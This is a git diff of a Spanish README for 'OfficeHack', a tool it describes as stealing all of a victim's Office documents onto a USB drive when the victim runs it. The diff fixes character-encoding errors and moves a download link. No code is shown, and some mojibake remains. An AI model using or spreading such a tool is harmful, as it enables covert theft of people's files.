@@ -1,15 +1,15 @@
 # OfficeHack
-OfficeHack roba todo lo que es documento de office y las copia a una USB cuando la victima lo ejecute la aplicaciÃ³n.
+OfficeHack roba todo lo que es documento de office y las copia a una USB cuando la victima lo ejecute la aplicación.
 
-- MAS INFORMACIÃ“N 
+- MAS INFORMACIÓN 
 
 ![](https://raw.githubusercontent.com/Pericena/OfficeHack/master/imagenes/Screenshot_15.png)
 
-https://lpericena.blogspot.com/2017/12/officehack.html
+- https://lpericena.blogspot.com/2017/12/officehack.html
 
 ## Comenzando
 
-_Estas instrucciones te permitirÃ¡n obtener una copia del proyecto en funcionamiento en tu mÃ¡quina local para propÃ³sitos de desarrollo y pruebas._
+_Estas instrucciones te permitirán obtener una copia del proyecto en funcionamiento en tu mÃ¡quina local para propÃ³sitos de desarrollo y pruebas._
 https://github.com/Pericena/OfficeHack.git
 Mira **Deployment** para conocer como desplegar el proyecto.
 
@@ -21,9 +21,8 @@ _Que cosas necesitas para instalar el software y como instalarlas_
 ```
  - windows 7/10
  - USB 
- - Descargar https://github.com/Pericena/OfficeHack/tree/master/Descargar 
 ```
-
+ - Descargar https://github.com/Pericena/OfficeHack/tree/master/Descargar 
 ### Instalación
 
 ```
@@ -112,4 +111,4 @@ Este proyecto estÃ¡ bajo la Licencia (Licencia pÃºblica general de GNU) - mi
 * Gracias  ðŸ¤“.
 
 ---
-âŒ¨ï¸ Por [Pericena](https://github.com/Pericena) ðŸ˜Š
+ Por [Pericena](https://github.com/Pericena) ðŸ˜Š
